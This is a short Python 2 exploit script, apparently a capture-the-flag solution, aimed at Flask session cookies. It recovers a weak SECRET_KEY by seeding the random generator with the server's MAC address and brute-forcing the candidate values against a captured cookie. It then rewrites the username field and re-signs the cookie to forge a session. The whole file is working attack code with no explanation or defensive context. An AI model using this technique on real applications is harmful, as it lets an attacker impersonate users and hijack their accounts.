#!/usr/bin/env python2
# encoding:utf-8

import random

import session_cookie_manager

mac = "02:42:c0:a8:20:02"
random.seed(int(mac.replace(":", ""), 16))
for x in range(1000):
    SECRET_KEY = str(random.random() * 233)
    rs = session_cookie_manager.FSCM.decode('eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.XSvUPA.wZLQx0OtNIiEv8Q9j2ueW2FJ6-w', SECRET_KEY)
    if 'error' not in rs:
        print(SECRET_KEY)
        rs[u'username'] = 'fuck'
        print(str(rs))
        print(session_cookie_manager.FSCM.encode(SECRET_KEY, str(rs)))
        break
